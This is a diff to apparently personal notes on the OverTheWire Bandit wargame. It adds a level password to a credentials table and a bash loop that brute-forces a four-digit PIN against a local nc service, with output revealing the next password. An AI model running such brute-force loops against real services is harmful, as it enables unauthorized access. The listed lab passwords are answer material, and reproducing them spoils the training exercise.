@@ -27,7 +27,7 @@ level | URL | port | login | pass | Notes
 22 | bandit.labs.overthewire.org | 2220 | bandit22 | Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI | [bandit 22](https://overthewire.org/wargames/bandit/bandit23.html) |
 23 | bandit.labs.overthewire.org | 2220 | bandit23 | jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n | [bandit 23](https://overthewire.org/wargames/bandit/bandit24.html) |
 24 | bandit.labs.overthewire.org | 2220 | bandit24 | UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ | [bandit 24](https://overthewire.org/wargames/bandit/bandit25.html) |
-25 | bandit.labs.overthewire.org | 2220 | bandit25 |  | [bandit 25](https://overthewire.org/wargames/bandit/bandit26.html) |
+25 | bandit.labs.overthewire.org | 2220 | bandit25 | uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG | [bandit 25](https://overthewire.org/wargames/bandit/bandit26.html) |
 26 | bandit.labs.overthewire.org | 2220 | bandit26 |  | [bandit 26](https://overthewire.org/wargames/bandit/bandit27.html) |
 27 | bandit.labs.overthewire.org | 2220 | bandit27 |  | [bandit 27](https://overthewire.org/wargames/bandit/bandit28.html) |
 28 | bandit.labs.overthewire.org | 2220 | bandit28 |  | [bandit 28](https://overthewire.org/wargames/bandit/bandit29.html) |
@@ -540,4 +540,33 @@ for first in {0..9}
 
 ./pithei_bandit24_to_25.sh &
 tail -f result.txt
+
+-----------------------
+
+#!/bin/bash
+# better version, i can start from where i left after session kill if cant use screen
+pass="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
+ for i in $(seq -w 1819 9999)
+     do
+         echo "trying $pass $i"
+         echo "trying $pass $i" >> 24.txt
+         echo "$pass $i" | timeout 1 nc localhost 30002 >> 24.txt &
+         sleep 0.7
+    done
+
+
+
+bandit24@bandit:/tmp/bandit24_pithei$ cat 24.txt | grep -v 'I am' | grep -v 'Timeout' | grep -v Wrong | grep -v trying
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+Exiting.
+bandit24@bandit:/tmp/bandit24_pithei$ grep -B 3 -A 2 Correct 24.txt
+Wrong! Please enter the correct pincode. Try again.
+trying UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 2588
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+bandit24@bandit:/tmp/bandit24_pithei$
 ```
